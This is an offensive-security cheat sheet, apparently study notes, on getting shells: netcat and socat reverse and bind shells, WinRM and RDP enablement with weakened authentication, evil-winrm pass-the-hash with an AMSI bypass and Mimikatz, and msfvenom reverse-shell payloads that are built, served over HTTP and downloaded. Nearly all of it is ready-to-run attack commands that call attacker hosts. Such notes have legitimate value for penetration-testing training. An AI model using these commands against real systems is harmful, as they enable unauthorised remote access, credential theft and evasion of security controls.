# Working with shells

## Linux Shell Breakout

* spawn a /bin/bash using Python
* `https://docs.python.org/3/library/pty.html`

```bash
python -c 'import pty;pty.spawn("/bin/bash")';
export TERM=xterm-256color
alias ll='clear ; ls -lasht --color=auto'
# CRTL + Z [backgroud process]
stty raw -echo; fg ; reset
stty column 200 rows 200
```

## Linux Shells

* Connect to a TCP/UDP port with Netcat
* Listen on a TCP/UDP port with Netcat
* Gain Remote Access to a host with Netcat
* Execute a Netcat bind shell
* Execute a Netcat reverse shell
* Netcat vs. Socat
* Socat reverse shells
* SSH shells

## Connect to a TCP/UDP port with Netcat

* -n don't do DNS resolution
* -v verbose

`nc -nv 10.11.0.22 110`

## Listen on a TCP/UDP port with Netcat

* -l start listener
* -p port

`nc -nlvp 4444`

## Execute a Netcat bind shell

* server bind a command shell on a specific port
* -e provide stdin, stout and stderr of a shell

`nc -nlvp 4444 -e cmd.exe`

## Execute a Netcat reverse shell

* client send a command shell to a **host listening on a port**.

```bash
nc -nlvp 4444
nc -nv host 4444 -e /bin/bash
```

## Netcat vs. Socat

* <https://nc110.sourceforge.io/>
* <http://www.dest-unreach.org/socat/doc/socat.html>
* -d verbosity
* **socat connect requires a '-' as first address**,

```bash
echo "Socat Connect"
nc <remote> 80
socat - TCP4:<remote>:80
```

```bash
echo "Socat Listener"
sudo nc -lvp localhost 443
sudo socat TCP4-LISTEN:443 STDOUT
sudo socat TCP4-LISTEN:443 EXEC:/bin/bash
```

```bash
echo "Reverse Shell"
nc -nlvp 4444
nc -nv host 4444 -e /bin/bash
socat -d -d TCP4-LISTEN:443 STDOUT
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

## SSH shells

* -p remote port
* -o stricthostkeychecking=no **avoid this option in real world**
* Online Wargame for beginners `https://overthewire.org/wargames/bandit/`
* Use the config which is read ~/.ssh/config before /etc/ssh/ssh_config
* `https://linuxize.com/post/using-the-ssh-config-file/`

ssh kali@localhost -p 22
ssh -o stricthostkeychecking=no webadmin@192.168.0.2 -p 2220

```bash
kali@kali:~/.ssh$ cat config
Host webadmin
        HostName webadmin@192.168.0.2
        User webadmin
        Port 22

kali@kali:~/.ssh$ ssh webadmin
```

## Windows Shells

* Remote shells with PowerShell Remoting
* Remote shells with psexec (requires SBM)
* Remote shells with evil-winrm (requires WinRM)
* Remote shells with xfreerdp3 or rdesktop (requires RDP)

## Enable Powershell Remoting (requires WinRM)

```powershell
# Enable PS Remoting
Enable-PSRemoting
Set-Item wsman:\localhost\client\trustedhosts $IP
Set-Item wsman:\localhost\client\trustedhosts $Rhost
```

## Remote shells with PowerShell Remoting (requires WinWM)

* run PowerShell as admin
* enable Enable-PSRemoting
* add IP to trustedhosts using wsman
* invoke a remote command or a remote shell
* `https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/about/about_wsman_provider?view=powershell-7.2#setting-the-value-of-items-in-the--wsman-drive`
* `https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works`

```powershell
# Run PS Remoting shell
$secure = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("domain.com\user", $secure)
Enter-PSSession -ComputerName $IP -Credential $cred
Enter-PSSession -ComputerName $Rhost -Credential $cred
```

```powershell
# Run Remote Shell Commands
Invoke-Command -ComputerName $IP -Credential $cred -ScriptBlock { systeminfo }
```

### Enable Windows Remote Management (WinRM)

* Set-WSManQuickConfig: Configures the local computer for remote management. It starts a service opens the firewall.
* `https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/about/about_ws-management_cmdlets?view=powershell-7.2`

```powershell
# Enable WinRM
Set-WSManQuickConfig
Test-WSMan 

# Enable WinRM manually, if WSManQuickConfig fails
Add-LocalGroupMember -Group "Remote Management Users" -Member "admin"
Set-Item -Path WSMan:\localhost\Service\Auth\Basic -Value $true
Set-Item WSMan:\localhost\Client\TrustedHosts "*"
Restart-Service WinRM

# Add firewall rule, if enabled
New-NetFirewallRule -DisplayName "WinRM HTTPS" -Name "WinRM-HTTPS" -Protocol TCP -LocalPort 5986 -Direction Inbound -Action Allow

# Enable WinRM non-powershell if not working
net localgroup 'Remote Management Users' admin /add
winrm set winrm/config/service/auth "@{Basic=`"true`"}"
winrm set winrm/config/client @{TrustedHosts="*"}
net stop winrm
net start winrm

# Add firewall rule, if enabled
netsh advfirewall firewall add rule name="WinRM HTTPS" ^ dir=in action=allow protocol=TCP localport=5986
```

```plain
# Enable WinRM via GPOs on DV

1. Allow remote server management through WinRM
Group Policy Management Editor
Computer Configuration
→ Policies
 → Administrative Templates
  → Windows Components
   → Windows Remote Management (WinRM)
    → WinRM Service
     → Allow remote server management through WinRM
       Set to: Enabled
       IPv4 filter: *
       IPv6 filter: *
     → Allow Basic authentication
       Set to: Enabled
    → WinRM Client
     → TrustedHosts
       Set to: * (or specify hosts)

2. Enable Windows Remote Management (HTTP‑In) firewall rule
Group Policy Management Editor
Computer Configuration
→ Policies
 → Windows Settings
  → Security Settings
   → Windows Defender Firewall with Advanced Security
    → Inbound Rules
      → Find Windows Remote Management (HTTP‑In)
        Enable Rule
```

### Setup WinRM with HTTPS (if required)

```powershell
$cert=New-SelfSignedCertificate `
  -Subject "CN=$env:COMPUTERNAME" `
  -CertStoreLocation "Cert:\LocalMachine\My" `
  -KeyUsage DigitalSignature, KeyEncipherment `
  -KeyAlgorithm RSA `
  -KeyLength 2048 `
  -Type SSLServerAuthentication `
  -TextExtension @("2.5.29.17={text}dns=$env:COMPUTERNAME&dns=$env:COMPUTERNAME.local")

# Use winrm directly
$thumb = $cert.Thumbprint
winrm create winrm/config/Listener?Address=*+Transport=HTTPS "@{Hostname=`"$env:COMPUTERNAME`";CertificateThumbprint=`"$thumb`"}"

# Net-Item is not working, some issue with the certificate?
# New-Item -Path WSMan:\Localhost\Listener\Listener -Transport HTTPS -Address * -Value "@{
#    Hostname              = `"$env:COMPUTERNAME`"
#    CertificateThumbprint = `"$thumb`"
#    Port                  = 5986
#}"

# Get Certificate
$cert=Get-ChildItem Cert:\LocalMachine\My\$thumb | Select-Object Subject, Thumbprint
# Remove Listener
Get-ChildItem WSMan:\Localhost\Listener | Where-Object { $_.Keys -contains "Transport=HTTPS" } | Remove-Item -Recurse -Force

# Troubleshooting
netsh http show sslcert
netsh http show urlacl
netsh http show servicestate

reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HTTP\Parameters\SslBindingInfo" /f
net stop http
net start http
```

## Remote shells with evil-winrm (WinRM TCP/5895)

* -P, --port PORT                  default 5985
* -H, --hash HASH                  NTLM Hash
* -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path (loaded into remote memory)
* -e, --executables EXES_PATH      C# executables local path (loaded into remote memory)
* --spn SPN_PREFIX                 SPN prefix for Kerberos auth (default HTTP)
* Source `https://github.com/Hackplayers/evil-winrm`

```bash
# WinRM User/Password
evil-winrm -i IP -u domain\user -p password

# WinRM NTLM Pass-the-hash (pth)
evil-winrm -i IP -u domain\user -H 32196B56FFE6F45E294117B91A83BF38
```

Common evil-winrm Commands

| Command       | Description                | Usage                                           |
| :---          | :---                       | :---                                            |
| menu          | Show available commands    | menu                                            |
| upload        | Upload file to target      | upload /local/file.exe C:\Windows\Temp\file.exe |
| download      | Download file from target  | download C:\file.txt /tmp/file.txt              |
| services      | List services              | services                                        |
| Bypass-4MSI   | Bypass AMSI e.g. AV detect | Bypass-4MSI                                     |
| Invoke-Binary | Execute binary from memory | Invoke-Binary /local/path/to/csharp/binary.exe  |

```bash
# Run Shell Commands (from local path)
evil-winrm -i IP -u domain\user -p password -s /opt/tools/local/path/powershell/scripts
Bypass-4MSI

Invoke-Mimikatz.ps1
Invoke-Mimikatz

Invoke-ConPtyShell.ps1
Invoke-ConPtyShell

# Run C# Executeables (from local path)
evil-winrm -i IP -u domain\user -p password -e /opt/tools/local/path/csharp/binaries
Bypass-4MSI

Invoke-Binary /opt/tools/local/path/csharp/binaries.exe
```

## Remote shells with psexec

* download PSExec
* extract it to System32
* create a psexec interactive session -i
* Source: `https://learn.microsoft.com/en-us/sysinternals/downloads/psexec`

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PSTools.zip"
Expand-Archive -Path .\PSTools.zip -DestinationPath C:\Windows\System32\
$RHOST="target IP"
psexec -accepteula
psexec "\\$ROST" -u user -p password -i cmd
psexec "\\$ROST" -u user -p password -i powershell
```

## Enable Remote Desktop Protocol (RDP)

```powershell
# Enable RDP
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "admin"
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'

# Enable RDP non-powershell
net localgroup 'Remote Desktop Users' admin /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
sc config TermService start= auto
sc start TermService
```

```plain
# Enable RDP using GPO on DC
Computer Configuration
  → Administrative Templates
    → Windows Components
      → Remote Desktop Services
        → Remote Desktop Session Host
          → Connections

# Finally, update GPOs
gpupdate /force
```

## Remote shell with xfreerdp3 (RDP TCP/3389)

* +clipboard
* +auto-reconnect
* /cert:ignore
* /dynamic-resolution
* /v:server
* /d:domain
* /u:user
* /p:'password'
* /pth: pass-the hash NTLM
* /list-kbd show avaliable keyboards

```bash
xfreerdp3 /list:kbd

# RDP User/Password
xfreerdp3 +clipboard +auto-reconnect /cert:ignore /d:domain.com /u:user /v:IP /p:'password' /dynamic-resolution /kbd:0x00010407
xfreerdp3 +clipboard +auto-reconnect /cert:ignore /u:domain.com\user /v:IP /p:'password' /dynamic-resolution /kbd:0x00010407

# RDP NTLM Pass-the-hash (pth) 
xfreerdp3 +clipboard +auto-reconnect /cert:ignore /d:domain.com /u:user /v:IP /pth:hidden /dynamic-resolution /kbd:0x00010407
xfreerdp3 +clipboard +auto-reconnect /cert:ignore /u:domain.com\user /v:IP /pth:hidden /dynamic-resolution /kbd:0x00010407
```

```bash
rdesktop -u user -p password $RHOST
```

## Custom Shell using MSFvenom

* `https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom`
* `https://www.offsec.com/metasploit-unleashed/msfvenom/`
* staged payloads require Metasploit framework
* let's use stageless payload instead
* -p use payload
* -f use format
* -a use arch
* -o output
* `https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c`

```bash
msfvenom -h
msfvenom --list payloads
msfvenom -l platforms
msfvenom -l formats
msfvenom --platform linux -l payloads | grep x86
msfvenom --platform windows -l payloads | grep x64
```

```bash
msfvenom -p linux/x86/shell_reverse_tcp --list-options
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f elf -o reverse_shell.elf
msfvenom -p linux/x86/windows/shell_reverse_tcp --list-options
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe -o reverse_shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe -o reverse_shell.exe
```

## Download Shell

```bash
sudo python -m http.server 8000
```

```bash
wget http://IP/reverse_shell.elf
```

```powershell
Invoke-WebRequest -Uri http://IP:8000/reverse_shell.exe -OutFile reverse_shell.exe
```
